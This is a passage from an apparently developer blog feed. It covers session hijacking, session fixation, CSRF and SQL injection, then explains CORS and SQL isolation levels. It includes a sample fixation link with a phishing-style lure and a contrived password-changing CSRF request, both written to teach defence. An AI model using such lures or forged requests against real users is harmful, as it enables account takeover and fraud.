&lt;p&gt;One way to gain access to it is, as I mentioned, cross-site scripting. Another typical way of gaining access to that cookie is by sniffing packets. Since browsers send the cookies associated with a domain for every request, somebody sniffing traffic would be able to see also the value of the session cookie. A typical way to sniff traffic is to set up an unencrypted Wi-Fi hotspot in a public place and monitor the traffic of the people connecting to it. Does this mean I cannot use my online banking when I am connected to a public hotspot? No, because if the website uses SSL for all requests, the contents of the traffic won’t be intelligible to a man-in-the-middle, and usually major sites like Facebook / Twitter, online banking, etc. are pretty well secured. There are however plenty of smaller poorly written sites that only use SSL for the login page, and then pass the session cookie unencrypted to other pages.&lt;/p&gt;

&lt;p&gt;Another way to gain access to a user’s session is to get that user to install malware on his/her computer. Since browsers usually store cookies on disk, that malware would be able to access the cookie if it knows where to look for it.&lt;/p&gt;

&lt;p&gt;A yet another way of accomplishing session hijacking is &lt;em&gt;session fixation&lt;/em&gt;. There are plenty of sites that accept a session ID in the URL, such as:&lt;/p&gt;

&lt;pre&gt;
http://www.website.com?sid=asb1sadasdasdan23123
&lt;/pre&gt;

&lt;p&gt;The reason why they do it is that a lot of users turn off their cookies, ironically, for security reasons. This, however, would open them up to scams, like somebody sending them an email which says:&lt;/p&gt;

&lt;blockquote&gt;
Hey, click on http://www.website.com?sid=asb1sadasdasdan23123, and enter credit card and address information to receive a free bonus on your order.
&lt;/blockquote&gt;

&lt;p&gt;Since the attacker knows the session id, he/she can also log to that page and see the information inputted by the user.&lt;/p&gt;

&lt;h2 id=&quot;cross-site-request-forgery&quot;&gt;Cross-Site Request Forgery&lt;/h2&gt;
&lt;p&gt;CSRF is an attack that tricks the victim into submitting a malicious request and relies on the fact that the user is logged in. Since the browser usually sends the session cookie with the request, the server perceives the request as legitimate. An important part of CSRF attacks is &lt;em&gt;social engineering&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/security/csfr.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s say a site exposes some functionality in the form of a web request, like so:&lt;/p&gt;

&lt;pre&gt;
GET https://www.thesite.com/account?password=val HTTP/1.1
&lt;/pre&gt;

&lt;p&gt;This example is a bit contrived and oversimplified, but you get the picture. If the attacker can get the user to click on a link which points to that link &lt;strong&gt;while logged in&lt;/strong&gt;, that’s going to have the effect of changing the password for the user to whatever the attacker wants. This link can be part of an email, or it can be part of a message on a public board or a website set up by the attacker, etc.&lt;/p&gt;

&lt;p&gt;An action that changes the password will more likely be a POST than a GET, but that doesn’t make it CSRF-proof either, because a user can be tricked into submitting a form. Here’s how that would work: you could have a form with a hidden input like so:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/6862d6a60d2dc4418a38fd81ae69e5bd.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Using HTML forms with email is not possible, because a lot of clients disable them or warn about them, but you could redirect the user to a page hosted somewhere. It turns out you don’t even have to trick him/her to click on the submit button, that can be done by the site using Javascript (say by reacting to the document load event).&lt;/p&gt;

&lt;p&gt;How about PUT and DELETE? Turns out that the &lt;em&gt;same-origin policy&lt;/em&gt; helps us here because attackers cannot do XHR requests from their site to the &lt;em&gt;http://www.thesite.com&lt;/em&gt;. It’s also why for POST attacks a form is being used instead of a POST XHR. SOP blocks that too.&lt;/p&gt;

&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;
&lt;p&gt;And last (in our article), but certainly not least, we have SQL injection. I think most of us remember this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/security/exploit.png&quot; alt=&quot;exploit&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For SQL injection to work, you’d have to be writing your SQL queries using string interpolation/concatenation.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/e842b81f3e4d1fef85087134717a1571.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;As you can see, the text fits nicely in the query. The way you get around this is by using parameters, which are supported by all database systems.&lt;/p&gt;</content><author><name></name></author><summary type="html">I can testify that a lot of people confided in me they considered doing this (including yours truly) under the frustration of the bi-monthly administrative policies that mandated we change our workstation password:</summary></entry><entry><title type="html">CORS Made Simple</title><link href="http://localhost:4000/cors-made-simple" rel="alternate" type="text/html" title="CORS Made Simple" /><published>2018-09-09T06:39:37+03:00</published><updated>2018-09-09T06:39:37+03:00</updated><id>http://localhost:4000/cors-made-simple</id><content type="html" xml:base="http://localhost:4000/cors-made-simple">&lt;p&gt;CORS stands for &lt;em&gt;Cross-Origin Resource Sharing&lt;/em&gt; and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as &lt;em&gt;same-origin policy&lt;/em&gt;. What this policy refers to is that an application cannot access resources via &lt;a href=&quot;https://www.w3schools.com/xml/xml_http.asp&quot;&gt;XMLHttpRequest&lt;/a&gt; or the &lt;a href=&quot;https://developers.google.com/web/updates/2015/03/introduction-to-fetch&quot;&gt;Fetch API&lt;/a&gt; that come from a different URL than where the page was originally served from.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/cors/cors.png&quot; alt=&quot;cors&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is a restriction implemented on the browser level—if you load a page that contains Javascript that is attempting to do an XHR request, you are are going to get an error. CORS is a mechanism to bypass this restriction. It allows the server to “accept” calls incoming from a different origin. The reason I am using quotes is that, as previously mentioned, it’s the browser that implements the restriction, but the server has the option of specifying several headers in the response that will make the browser accept the response.&lt;/p&gt;

&lt;h2 id=&quot;specifics&quot;&gt;Specifics&lt;/h2&gt;
&lt;p&gt;OK, so let’s get into specifics: first let’s see what exactly constitutes the same origin and what is a different origin. The policy looks at the protocol (http or https), port number and host URL. Let’s assume that our page is served from &lt;em&gt;http://domain1.page.com/index.html&lt;/em&gt;. Accessing the following URLs will give the following results:&lt;/p&gt;

&lt;pre&gt;
http://domain1.page.com/items/3213
# Success.

https://domain1.page.com/items/12
# This fails because it's using https instead of http.

http://somethingelse.com/
# Fails because it's a different domain.

http://domain2.page.com/items/32
# Fails because the subdomain is different

http://domain1.page.com:9000/items/32
# Fails because the port is different.
&lt;/pre&gt;

&lt;p&gt;Of course, if you ever built applications using a microservice architecture, you know that sometimes it’s desirable to allow access to the backend for applications that will be hosted elsewhere, but you don’t necessarily want to open access to everybody. So CORS is sort of a middle road between the two and it comes in handy when your applications are distributed because sometimes you just want to hook up things without configuring proxies and whatnot.&lt;/p&gt;

&lt;blockquote&gt;
We first must make the distinction between &lt;b&gt;simple requests&lt;/b&gt; and &lt;b&gt;preflighted requests&lt;/b&gt;.
&lt;/blockquote&gt;

&lt;p&gt;A simple request is a GET, POST or HEAD that meets a few conditions:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;No event listeners are registered on any &lt;em&gt;XMLHttpRequestUpload&lt;/em&gt; object used in the request and no &lt;em&gt;ReadableStream&lt;/em&gt; object is used in the request.&lt;/li&gt;
  &lt;li&gt;The only accepted headers are “CORS”: &lt;em&gt;Accept, Accept-Language, Content-Language, Content-Type, Last-Event-ID, DPR, Downlink, Save-Data, Viewport-Width&lt;/em&gt; and &lt;em&gt;Width&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;The accepted values for the Content header are: &lt;em&gt;application/x-www-form-urlencoded, multipart/form-data&lt;/em&gt; and &lt;em&gt;text/plain&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If the server supports CORS, it will return a response specifying a value for the &lt;em&gt;Access-Control-Allow-Origin&lt;/em&gt; header:&lt;/p&gt;

&lt;pre&gt;
Access-Control-Allow-Origin: *
# this allows access from any origin

Access-Control-Allow-Origin: http://domain2.page.com
# allows access from domain2.page.com

# etc.
&lt;/pre&gt;

&lt;p&gt;A &lt;em&gt;preflighted request&lt;/em&gt; is one that &lt;strong&gt;automatically&lt;/strong&gt; triggers an OPTIONS call to the server before the actual request. It looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/cors/cors_flow.png&quot; alt=&quot;image-title-here&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;If any of the conditions for the request to be a simple request is violated, then we have a preflighted request on our hand. This means that if we want to support CORS, our server needs to be able to respond to OPTIONS requests accordingly.&lt;/p&gt;

&lt;p&gt;This means we need something like:&lt;/p&gt;

&lt;pre&gt;
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: http://page.com
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: Content-Type
&lt;/pre&gt;

&lt;p&gt;… to tell the browser, it’s OK to send the real request.&lt;/p&gt;

&lt;p&gt;The whole concept of a “preflight request” seems a bit strange and you might be wondering why it was included in the spec. Couldn’t all requests be made without a preflight? A key concept to understand is that the role of the OPTIONS request doesn’t have to do with security.&lt;/p&gt;

&lt;blockquote&gt;
Preflight requests have the role of preserving the semantics of the web before CORS.
&lt;/blockquote&gt;

&lt;p&gt;In most previous applications (before REST and client-side applications became popular) involved GETs for retrieving webpages and POSTs for posting back form data. An old webserver which is CORS agnostic would never expect to receive a cross-domain DELETE request, and might behave unexpectedly in such cases. The preflight request is a way around this potential issue – it allows us to query the backend and see if it reliably supports CORS. You might have noticed that the allowed verbs are the ones that read and create data but NOT the ones that can modify existing information – like DELETE and PUT. Now you might be wondering: &lt;em&gt;couldn’t somebody just send a DELETE request via a tool like Postman, since CORS is implemented on the browser level?&lt;/em&gt; Sure, but that wouldn’t be a problem because backend services usually require authentication that would be stored locally in the form of a cookie and would be accessible to Javascript running in the browser but not to somebody doing a request using Postman.&lt;/p&gt;

&lt;h2 id=&quot;in-closing&quot;&gt;In Closing&lt;/h2&gt;
&lt;p&gt;Of course, you probably don’t want to be doing all that yourself, which is why there are libraries for supporting CORS in most platforms. If you’re using Node, it’s very simple to support CORS by using the &lt;a href=&quot;https://www.npmjs.com/package/cors&quot;&gt;cors library&lt;/a&gt; which is just simple Express middleware.&lt;/p&gt;

&lt;pre&gt;
npm install cors --save
&lt;/pre&gt;

&lt;p&gt;Using it is also very simple, it just needs to be registered as a middleware with Express.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/de8610422124cce393883120e77e150b.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;Configuring Rails to use CORS is equally easy.&lt;/p&gt;</content><author><name></name></author><summary type="html">CORS stands for Cross-Origin Resource Sharing and if you’ve built rich client applications that communicate with an API via REST, you have probably crossed paths with something known as same-origin policy. What this policy refers to is that an application cannot access resources via XMLHttpRequest or the Fetch API that come from a different URL than where the page was originally served from.</summary></entry><entry><title type="html">Relational Database Isolation Levels Explained</title><link href="http://localhost:4000/isolation-levels" rel="alternate" type="text/html" title="Relational Database Isolation Levels Explained" /><published>2017-07-02T06:39:37+03:00</published><updated>2017-07-02T06:39:37+03:00</updated><id>http://localhost:4000/isolation-levels</id><content type="html" xml:base="http://localhost:4000/isolation-levels">&lt;p&gt;This seems to be a murky concept for a lot of developers, so I thought I
would give a simple explanation. The concept of isolation is related to what happens when two or more transactions attempt to access (read and write) the same data at the same time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/isolation-levels/levels.png&quot; alt=&quot;levels&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The SQL standard defines four isolation levels:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Read uncommitted&lt;/li&gt;
  &lt;li&gt;Read committed&lt;/li&gt;
  &lt;li&gt;Repeatable reads&lt;/li&gt;
  &lt;li&gt;Serializable&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Most developers can explain the difference between Read committed and Serializable—between no locking at all and full locking. To understand the intermediary isolation levels, one needs to understand the difference between &lt;em&gt;dirty reads, non repeatable reads, and phantom reads&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Let’s try to explain them one by one.&lt;/p&gt;

&lt;h2 id=&quot;dirty-reads&quot;&gt;Dirty Reads&lt;/h2&gt;

&lt;p&gt;A dirty read is the simplest form of a problem that can occur. It means that a transaction can read the changes of another transaction, before that transaction has committed those changes. If a transaction is doing some calculations on a data row (say, part of a stored procedure), and stores the intermediary values of the calculation in the database, the other transactions will see this intermediary data.&lt;/p&gt;

&lt;p&gt;This is the &lt;strong&gt;read uncommitted&lt;/strong&gt; isolation level.&lt;/p&gt;

&lt;h2 id=&quot;non-repeatable-reads&quot;&gt;Non Repeatable Reads&lt;/h2&gt;
&lt;p&gt;A non repeatable read offers a bit more protection. Other transactions only see data once it is committed. There is however the problem that while a transaction is running, another transaction might have changed and committed the value for a certain row in the meantime. If a row is accessed multiple times during to course of a transaction, that transaction might see different values for the same row.&lt;/p&gt;

&lt;p&gt;This is the &lt;strong&gt;read committed&lt;/strong&gt; isolation level.&lt;/p&gt;

&lt;p&gt;The repeatable reads isolation level solves the previous problem. In this case, when a transaction reads a row, it also locks it so that no other transaction will be able to modify it until the current transaction is finished. This way it avoids the case where the value can be changed, but it also introduces more contention in the database because transactions now have to wait more after one another.&lt;/p&gt;

&lt;h2 id=&quot;phantom-reads&quot;&gt;Phantom Reads&lt;/h2&gt;
&lt;p&gt;Then there is the problem of phantom reads. So far, all the locking was done on the row level, to prevent issues with updates on data items. But let’s consider another scenario: a transaction doesn’t change existing items in a table, but instead inserts new items. Other long-running transactions might query this table multiple times during their execution and get different collections.&lt;/p&gt;

&lt;p&gt;The serializable isolation solves this problem in a similar way to the previous isolation level. When reading data, it also places a lock on it—the difference is that instead of placing data on a row, it places a lock on a range.&lt;/p&gt;

&lt;p&gt;This range is based on the query - for example:&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/toaderflorin/181e34df07fcb647671e9512c3e276bf.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;This introduces even more contention.&lt;/p&gt;</content><author><name></name></author><summary type="html">This seems to be a murky concept for a lot of developers, so I thought I would give a simple explanation. The concept of isolation is related to what happens when two or more transactions attempt to access (read and write) the same data at the same time.</summary></entry></feed>